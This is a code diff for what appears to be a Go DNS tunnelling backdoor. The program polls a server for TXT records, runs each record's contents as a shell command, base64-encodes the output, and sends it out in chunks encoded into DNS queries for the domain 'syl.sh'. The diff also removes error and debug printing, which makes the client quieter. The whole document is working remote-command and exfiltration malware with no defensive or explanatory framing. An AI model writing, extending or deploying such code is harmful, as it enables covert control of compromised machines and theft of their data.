@@ -19,17 +19,15 @@ const (
 )
 
 func main() {
+	baseAnswerUri := "syl.sh"
 	m := new(dns.Msg)
 	m.SetQuestion("google.com.", dns.TypeTXT)
 
 	for {
-		// Do you Have something for me?
-		r, err := dns.Exchange(m, host)
-		if err != nil {
-			fmt.Println("cannot reach the server")
-		}
+		r, _ := dns.Exchange(m, host)
 		if r != nil {
 			for _, a := range r.Answer {
+				// if the `Answer` is a Txt RR
 				if txt, ok := a.(*dns.TXT); ok {
 					if txt.Txt[0] == "" {
 						break
@@ -44,14 +42,12 @@ func main() {
 
 					out, err := exec.Command(cmdToExecute, cmdArgs...).CombinedOutput()
 					if err != nil {
-						fmt.Println(err)
 						out = []byte(" ")
 					}
 					outEnc := base64.StdEncoding.EncodeToString(out)
-					baseUrl := "syl.sh"
 
 					// Add Space for META inf
-					dataLeft := (maxMsgLen - len(baseUrl)) - metaInfoLen
+					dataLeft := (maxMsgLen - len(baseAnswerUri)) - metaInfoLen
 
 					chunks := Chunks(outEnc, dataLeft)
 					for i, chunkOut := range chunks {
@@ -59,13 +55,12 @@ func main() {
 						currentChunk := strconv.Itoa((i + 1))
 
 						// Build the Chunk URL
-						chunkUrl := baseUrl +
+						chunkUrl := baseAnswerUri +
 							"?" + "cs=" + chunkLen +
 							"&" + "cc=" + currentChunk +
 							"&" + "o=" + chunkOut +
 							"."
 
-						fmt.Println(chunkUrl)
 						nm.SetQuestion(chunkUrl, dns.TypeTXT)
 						_, err := dns.Exchange(nm, host)
 						if err != nil {
